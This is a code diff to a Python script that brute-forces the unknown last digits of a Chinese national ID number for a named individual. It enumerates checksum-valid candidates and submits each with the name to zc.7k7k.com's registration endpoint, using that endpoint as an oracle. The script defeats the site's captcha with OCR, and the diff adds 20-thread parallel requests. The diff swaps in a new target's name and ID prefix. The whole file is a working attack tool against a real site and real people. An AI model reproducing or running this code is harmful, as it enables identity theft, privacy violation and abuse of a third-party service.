@@ -3,6 +3,13 @@ import time
 import muggle_ocr
 import os
 import json
+import threadpool
+import random
+class Finish(SyntaxWarning):
+    pass
+class PauseInfo(SyntaxWarning):
+    pass
+pause_num = 0    
 def check_id(id):
     # t代表身份证号码的位数，w表示每一位的加权因子
     t = []
@@ -52,10 +59,11 @@ def check_id(id):
 def convert(session):
     tmp=session.get("http://zc.7k7k.com/")
     tmp=session.get("http://zc.7k7k.com/authcode?width=100&height=42&k=reg").content
-    with open("yzm_new.png",'wb')as f:
+    t=str(int(random.random()*10105000))
+    with open(f"img\\{t}.png",'wb')as f:
         f.write(tmp)
     sdk = muggle_ocr.SDK(model_type=muggle_ocr.ModelType.OCR)
-    with open("yzm_new.png", "rb") as f:
+    with open(f"img\\{t}.png", "rb") as f:
         b = f.read()
     st = time.time()
     text = sdk.predict(image_bytes=b)
@@ -81,26 +89,44 @@ def check(sfz,xm):
     
     result=int(json.loads(s.post(url="http://zc.7k7k.com/post_reg",data=data).text)["state"])
     if(result==-10):
-        #print("验证码识别识别 正在重试(Retry)")
+        print("验证码识别识别 正在重试(Retry)")
         time.sleep(5)
         check(sfz,xm)
     elif result==0:
-        #print(f"信息正确:{sfz} : {xm}")
+        print(f"信息正确:{sfz} : {xm}")
         with open("success","a+") as f:
             f.write(f"信息正确:{sfz} : {xm}\n")
-        return sfz,xm
+        raise Finish
     elif result==-1:
-        #print(f"信息错误:{sfz} : {xm}")
-        return False,False
+        print(f"信息错误:{sfz} : {xm}")
 #-------------------------------------------------------------------
-former="33082120040322"        #区号+生日
+former="53252719840203"        #区号+生日
 lis="0123456789"               
 o="0123456789X"
 m="13579"#male 男性
 f="02468"#female 女性
-xm="刘彦阳"#姓名
+xm="芶宁岗"#姓名
 is_male=True#是否男性
 #-------------------------------------------------------------------
+
+
+def run(sfz_list,pools=10):#批量验证
+    works = []
+    for i in sfz_list:
+            works.append(((i,xm), None))
+    pool = threadpool.ThreadPool(pools)
+    reqs = threadpool.makeRequests(check, works)
+    [pool.putRequest(req) for req in reqs]
+    try:
+        pool.wait()
+    except Finish as e:
+            exit(0)
+    except Exception as e:
+            print('Unknown error so will quit')
+            sys.exit(1)
+    
+    
+sfz_list=[]
 for i in lis:
     for j in lis:
         if(is_male):
@@ -108,16 +134,11 @@ for i in lis:
                 for l in o:
                     _all=former+str(i)+str(j)+str(k)+str(l)
                     if(check_id(_all)):
-                        result=check(_all,xm)
-                        if(result[0]):
-                            print(f"爆破成功: {result[1]} : {result[0]}")
-                            break
+                        sfz_list.append(_all)
         else:
             for k in f:
                 for l in o:
                     _all=former+str(i)+str(j)+str(k)+str(l)
                     if(check_id(_all)):
-                        result=check(_all,xm)
-                        if(result[0]):
-                            print(f"爆破成功: {result[1]} : {result[0]}")
-                            break
+                        sfz_list.append(_all)
+run(sfz_list,20)         
